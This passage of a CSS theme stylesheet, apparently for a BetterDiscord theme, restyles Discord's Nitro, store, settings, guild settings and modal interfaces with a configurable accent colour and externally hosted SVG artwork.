	color: rgba(var(--vaccentcolor), 0.2);
}

.grandfatheredMessage-1BnHtv {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tierGrandfathered-R6zrrD.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier1-UUxEBG,
.headerTier1-2Ckjmd,										/* submodal				tier1 header						*/
.tier1HeaderBackground-3LjWgU {								/* submodal				tier1 bg							*/
	background-color: rgb(var(--vaccentcolor));
}
.headerTier1-2Ckjmd .wrapper-1P_m9K image:not([width="170px"]),
.tier1HeaderBackground-3LjWgU .wrapper-1P_m9K image:not([width="170px"]) {
	display: none !important;
}
.tier1-1ttHRY.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier2-3pW_6T,
.headerTier2-3FKMxd,										/* submodal				tier2 header						*/
.tier2HeaderBackground-2BUqcl {								/* submodal				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tier2-3hSil0.banner-3Kac2g {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.price-1rEl-z {												/* submodal				price								*/
	color: rgb(var(--vaccentcolor));
}

.iconBackgroundTier1-2GOcU8 {								/* tierlist				tier1 bg							*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.iconBackgroundTier2-2TeI3a {								/* tierlist				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.xboxPromotion-1k0m0c {										/* bannerpromo			xboxpromo							*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.bannerPromotionLogoPremium-2cB301 {						/* bannerpromo			logo								*/
	background: #ffcd4b linear-gradient(rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.premiumLogo-1D3iJc {										/* bannerpromo			nitro logo							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .tag-HanR-9 {									/* tag														*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .tag-HanR-9::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/04a2e1509ad72be575b1529b51ea3977.svg) top/cover no-repeat;
}

.skuButtonTier1-2XTq5D,
.skuButtonTier1-3-EFd9 {
	background: rgb(255, 255, 255) linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}
.skuButtonTier2-2asv3-,
.skuButtonTier2-i01WfL {
	background: #ffcd4b linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .alternativeSkuSelected-3Qhw9n {
	background-color: rgb(var(--vaccentcolor));
}

.overlappingBorder-1-XPGl {									/* store				preview image						*/
	border-color: rgb(var(--vaccentcolor));
}

#app-mount .headerFancy-1AcCLF {							/* store				header fancy						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .premiumHeaderPrice-1F1CMD {						/* store				price								*/
	background-color: rgb(var(--vaccentcolor));
}
.premiumCircle-3jgziV {										/* store				premiumcircle						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .staffIcon-2MB1se {								/* store				stafficon							*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .nitroIcon-2uS3VJ {								/* store				nitroicon							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.perkTag-2O4dx4 {											/* store				perktag								*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.confirmPremiumIcon-26GX5Y,									/* store				confirmpremiumicon					*/
.gameIcon-gg34Dz[style*="/assets/f6cbcdc9366fb8d31e03bdc6c9c50246.svg"] {
	background-color: rgb(255, 255, 255) !important;
	background-image: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/nitrobadge_details.svg), linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5)) !important;
}
.pageWrapper-3F6owx {										/* store				pagewrapper							*/
	background: white linear-gradient(114deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.6));
}


/* ~~~~		6.		LIBRARY							~~~~ */

.foreground-2aE44H {										/* installationpath		fill								*/
	stroke: rgb(var(--vaccentcolor));
}


/* ~~~~		7.		DISCOVERY						~~~~ */

.searchBox-3Y2Vi7:focus,									/* searchbox			focus								*/
.searchBox-3Y2Vi7:focus-within,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus-within {
	border-color: rgb(var(--vaccentcolor));
}
.search-1iTphC .searchBox-2_mAlO:focus,
.search-1iTphC .searchBox-2_mAlO:focus-within {
	box-shadow: 0 0 0 1px rgb(var(--vaccentcolor)), 0 0 0 2px rgba(var(--vaccentcolor), 0.6), 0 0 0 3px rgba(var(--vaccentcolor), 0.3);
}

#app-mount .activeButton-1BJAiN,							/* pagination			button								*/
#app-mount .activeButton-1BJAiN:hover {
	background-color: rgb(var(--vaccentcolor));
}

															/* categorylist			selected item						*/
.categoryItem-3zFJns.selectedCategoryItem-3X8ujp .itemInner-3gVXMG {
	background-color: rgb(var(--vaccentcolor));
}

.categoryPill-34fszg.selected-1dONk0 {						/* categorylist			search categorypill					*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		8.		USERSETTINGS					~~~~ */

.item-PXvHYJ[style^="color: rgb(114, 137, 218)"],
.item-PXvHYJ[style*=" color: rgb(114, 137, 218)"] {			/* settingsitems		item								*/
	color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ[style*="background-color: rgba(114, 137, 218, 0.1)"] {
	background-color: rgb(var(--vaccentcolor), 0.1) !important;
}
.item-PXvHYJ[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ:not(.selected-3s45Ha)[aria-controls="Nitro Server Boost-tab"],
.item-PXvHYJ[style^="color: rgb(114, 137, 218)"][aria-controls="GUILD_PREMIUM-tab"],
.item-PXvHYJ[style*=" color: rgb(114, 137, 218)"][aria-controls="GUILD_PREMIUM-tab"] {
	color: rgb(var(--vaccentcolor2)) !important;
}
.item-PXvHYJ:hover[aria-controls="Nitro Server Boost-tab"],
.item-PXvHYJ[style*="background-color: rgba(114, 137, 218, 0.1)"][aria-controls="GUILD_PREMIUM-tab"] {
	background-color: rgb(var(--vaccentcolor2), 0.1) !important;
}
.item-PXvHYJ.selected-3s45Ha[aria-controls="Nitro Server Boost-tab"],
.item-PXvHYJ[style*="background-color: rgb(114, 137, 218)"][aria-controls="GUILD_PREMIUM-tab"] {
	background-color: rgb(var(--vaccentcolor2)) !important;
}

.dot-2s_oHI {												/* settingsitems		dot									*/
	background-color: rgb(var(--vaccentcolor));
}

.cardBrand-39zmMQ {											/* settingsitems		card								*/
	background-color: rgb(var(--vaccentcolor));
}
.cardBrand-39zmMQ,
.cardBrandOutline-3jvFfo {
	border-color: rgb(var(--vaccentcolor));
}

.avatarUploaderInner-3UNxY3 {								/* accountsettings		avatar upload						*/
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .questionMark-CWEQZn,							/* accountsettings		questionmark						*/
#app-mount .questionMark-3qBhGj {							/* accountsettings		questionmark new					*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .questionMark-CWEQZn:hover,
#app-mount .questionMark-3qBhGj:hover {
	background: var(--vaccentcolor-hover);
}

.marketingLogoImage-2SzXIR {								/* boostsettings		boost header						*/
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.marketingLogoImage-2SzXIR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
#app-mount .tierUnlocked-27DwHo {							/* boostsettings		tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierAccomplished-2eXPdI,
#app-mount .tierCurrent-Lw7-4E,
#app-mount .tierDefault-2qaRkD {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}
#app-mount .tierCloseHint-380zIA {							/* boostsettings		tierclosehint						*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tierCloseHint-380zIA::before {
	border-right-color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlockedBackground-MW5XJU {			/* boostsettings		tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .foreground-2EIns2 {								/* boostsettings		icon foreground						*/
	color: rgb(var(--vaccentcolor2));
}
.emojiIcon-2xOPMD {											/* boostsettings		perkicon emoji						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
.uploadSizeIcon-2HNa5p {									/* boostsettings		perkicon upload						*/
	color: rgb(var(--vaccentcolor2));
	filter: brightness(75%);
}
.memberBadgeIcon-1hpSQc {									/* boostsettings		perkicon guild						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
.profileBadgeIcon-_ctnKj {									/* boostsettings		perkicon badge						*/
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_boostbadge_bg.svg) center/contain no-repeat;
}
.profileBadgeIcon-_ctnKj::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_boostbadge_accent.svg) center/contain no-repeat;
}
.premiumGuildIcon-13KUPa {									/* boostsettings		perkicon premium					*/
	color: rgb(var(--vaccentcolor2));
}
.gemWithLabel-2aecE_ {										/* boostsettings		progress label						*/
	color: rgb(var(--vaccentcolor2));
}
.gemIndicatorProgressCircle-3wDFa1 {						/* boostsettings		progress circle						*/
	color: rgb(var(--vaccentcolor2));
}
.guildSubscriberCountIcon-6Fo5EK {							/* boostsettings		sub count							*/
	color: rgb(var(--vaccentcolor2));
}
.guildSubscriptionSlotIcon-EVE04u {							/* boostsettings		slot icon							*/
	color: rgb(var(--vaccentcolor2));
}

.icon-3j1dJB {												/* hypesettings			perk icon							*/
	position: relative;
}
.icon-3j1dJB::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/common/empty.svg) center/cover no-repeat;
}
.perkNewsletter-2lxlA1 {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_hypeperk1_bg.svg) center/cover no-repeat;
}
.perkNewsletter-2lxlA1::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_hypeperk1_accent.svg) center/cover no-repeat;
}
.perkBadge-2la1kc {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_hypeperk2_bg.svg) center/cover no-repeat;
}
.perkBadge-2la1kc::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_hypeperk2_accent.svg) center/cover no-repeat;
}
.perkChallenges-19qHzw {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_hypeperk3_bg.svg) center/cover no-repeat;
}
.perkChallenges-19qHzw::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_hypeperk3_accent.svg) center/cover no-repeat;
}

.wrapper-3jrx9n {											/* overlaysettings		positionsettings wrapper			*/
	border-color: rgb(var(--vaccentcolor));
}
.option-n0icdO:hover {										/* overlaysettings		positionoption						*/
	background-color: rgb(var(--vaccentcolor));
}
.selected-mKYnfr.option-n0icdO {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* streamermodesettings	headerimage							*/
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_streamermode_bg.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + * {
	position: relative;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before,
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	content: "";
	position: absolute;
	top: 0;
	right: -204px;
	width: 184px;
	height: 110px;
	pointer-events: none;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_streamermode_accent.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_streamermode_details.svg) center/contain no-repeat;
}


/* ~~~~		9.		GUILDSETTINGS					~~~~ */
															/* widgetsettings		widget placeholder image 			*/
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type {
	position: relative !important;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type img[src="/assets/5fb477ca84edd15d9a2888ac28365acd.svg"] {
	object-position: -999999px -999999px;
	flex: unset !important;
	height: 310px !important;
	min-width: 320px !important;
	background: var(--background-tertiary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_widget_bg.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before,
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	content: "";
	position: absolute;
	right: 0;
	bottom: 0;
	width: 320px;
	height: 310px;
	pointer-events: none;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_widget_accent.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	background: var(--header-primary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_widget_details.svg) center/contain no-repeat;
}

@-webkit-keyframes pulseBorder-1LZYy9 { 					/* intergrationsettings	new webhook							*/
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}
@keyframes pulseBorder-1LZYy9 {
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}


.placeholderImage-37MstR {									/* discoverysettings	insight								*/
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_insight_bg.svg) center/cover no-repeat;
}
.placeholderImage-37MstR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_insight_accent.svg) center/cover no-repeat;
}
															/* discoverysettings	partner program						*/
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] {
	object-position: -999999px -999999px;
	filter: grayscale(0.5);
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_partnerprogram_bg.svg) center/cover no-repeat;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + *::after {
	content: "";
	position: absolute;
	top: -281px;
    width: 428px;
    height: 241px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_partnerprogram_accent.svg) center/cover no-repeat;
}

.defaultIcon-2NMkWn {										/* discoverysettings	default guildicon					*/
	background-color: rgb(var(--vaccentcolor));
}

															/* discoverysettings	requirements icon					*/
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"],
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] {
	object-position: -999999999px -999999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_requirements_bg.svg) center/cover no-repeat;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + * {
	position: relative;
	height: 60px;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *::after,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	bottom: 10px;
	width: 40px;
	height: 40px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_requirements_accent.svg) center/cover no-repeat;
}

.featureIcon-3p1TC_ [fill="#7289da" i] {					/* communitysettings	intro		featureicon				*/
	fill: rgb(var(--vaccentcolor));
}

.info-1LuGpo {												/* communitysettings	partnership							*/
	color: rgb(var(--vaccentcolor));
}

.fakeButton-kGEmb3 {										/* communitysettings	rules		example fake			*/
	background-color: rgb(var(--vaccentcolor));
}

.exampleWumpus-3QIhvG .wumpus-3Q6pSF,						/* communitysettings	rules		wumpus					*/
.exampleWumpus-1zk2dq .wumpus-3JzuYd {						/* communitysettings	welcome		wumpus					*/
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpus_bg.svg) center/cover no-repeat;
}
.exampleWumpus-3QIhvG::after,
.exampleWumpus-1zk2dq::after {
	content: "";
	position: absolute;
	width: 82px;
	height: 72px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpus_accent.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d,						/* communitysettings	rules		wumpus icon				*/
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {				/* communitysettings	rules		wumpus icon				*/
	position: relative;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {
	display: flex;
	justify-content: center;
	white-space: pre;
}
.exampleModal-2oh58d .guildIcon-38Zs0M,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p {
	object-position: -999999px -999999px;
	border-radius: 10px;
	background: white url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpusicon_bg.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after {
	top: 0;
	width: 48px;
	height: 48px;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	top: -80px;
	width: 64px;
	height: 64px;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	content: "";
	position: absolute;
	border-radius: 10px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpusicon_accent.svg) center/cover no-repeat;
}


/* ~~~~		10.		MODALS							~~~~ */

/* ----		10.1.	USERMODAL						---- */

.topSectionPlaying-1J5E4n {									/* modal				topsection playing					*/
	background: rgb(var(--vaccentcolor));
}

.container-q03LZO.colored-1armap .profileBadgeBugHunterLevel1-dbEzVz {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/df26f079738a4dcd07cbce6eb3c957f1.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileBadgeBugHunterLevel2-3TUciC {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/16def052b03d75dac0ed9234c5d6a880.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl1-3oI9tx {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/24e49184598820f274e62293349a2e43.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl2-r6nJHT {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/cc73fba5c2e9b70752bbd1db35a1b9c3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl3-38s3Dj {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/a4c3939a9b03274246df9b144fcd86cf.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl4-2NXrsI {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/d01bee8a9b41bd9dda26a43221b2e7e8.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl5-3XIa2K {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/a99def5f819c077e5e5061cab741b7e6.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl6-3e3sxW {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/2cfb317f3db3963d8ded9a97ee967bac.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl7-1dVhQT {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/278736f579d810b11ddf308cb598b19e.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl8-1kXdFr {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/38e40f25802a0fdf480d9b855a37a2f3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl9-1d6zav {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/cfbc2d8ceacfacf07850f986c8165195.svg) center/contain no-repeat;
}

.guildAvatarWithoutIcon-1sTmE_ {							/* modal				shared servers no icon				*/
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.2.	GUILDADD/CREATION				---- */
															/* create guild			create own icon						*/
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] {
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildcreate_createown_accent.svg) center/contain no-repeat;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + * {
	position: relative;
	display: flex;
	align-items: center;
	overflow: visible;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	width: 48px;
	height: 48px;
	pointer-events: none;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildcreate_createown_bg.svg) center/contain no-repeat;
}

.uploadIcon-2IFzZU [fill="#7289da" i] {						/* create guild			upload icon							*/
	fill: rgb(var(--vaccentcolor));
}

/* ----		10.3.	REGIONSELECTMODAL				---- */

.regionSelectFlag-3uwFtG,									/* modal				regionselect flag					*/
.regionSelectFlag-1htPow {
	background-color: rgb(var(--vaccentcolor));
}
.vip-3pFIN8::after,											/* modal				regionselect vip					*/
.vip-1SuRbe::after {
	background: rgb(var(--vaccentcolor));
}
.regionSelect-3lf4eE button {								/* modal				regionselect button					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover .regionSelectInner-24f4Ce,
#app-mount .regionSelect-3lf4eE:hover button {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover button {
	background-color: rgb(var(--vaccentcolor));
}
.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {	/* modal				regionselect header					*/
	color: rgb(var(--vaccentcolor));
}
															/* modal				regionselect option					*/
.regionSelectModal-12e-57 .regionSelectModalOption-2DSIZ3:hover {
	border-color: rgb(var(--vaccentcolor));
}
.check-2by_h9 {
	-webkit-mask: url(https://discordapp.com/assets/6acb20d5e709b34b6a7f36ec13648666.svg);
	background: rgb(var(--vaccentcolor));
}

/* ----		10.4.	UPLOADMODAL						---- */
															/* modal				background							*/
.uploadModalIn-1z07Bv .uploadDropModal-2kTwbc .bgScale-1otPtc {
	background-color: rgb(var(--vaccentcolor));
}

.attachment-33OFj0 .icon-1kp3fr,
.audioMetadata-3zOuGv::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j),
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j) {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_bg.svg) center/contain no-repeat !important;
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after,
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	content: "";
	position: absolute;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
}
.markup-2BOw-j > .attachment-33OFj0 {
    position: relative;
}
.attachment-33OFj0 .icon-1kp3fr {
	background-size: 120% !important;
}
.audioMetadata-3zOuGv::before {
	background-position: center -4px !important;
	background-size: 140% !important;
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after {
	top: 9px;
	left: 8px;
	width: 36px;
	height: 48px;
}
.markup-2BOw-j > .attachment-33OFj0 .icon-1kp3fr + *::before,
.markup-2BOw-j > .attachment-33OFj0 .icon-1kp3fr + *::after {
	top: 6px;
	left: 7px;
}
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after {
	top: 0;
	left: 5px;
	width: 34px;
	height: 56px;
}
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	width: 100px;
	height: 130px;
}
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::after {
	background: rgb(240, 71, 71);
}
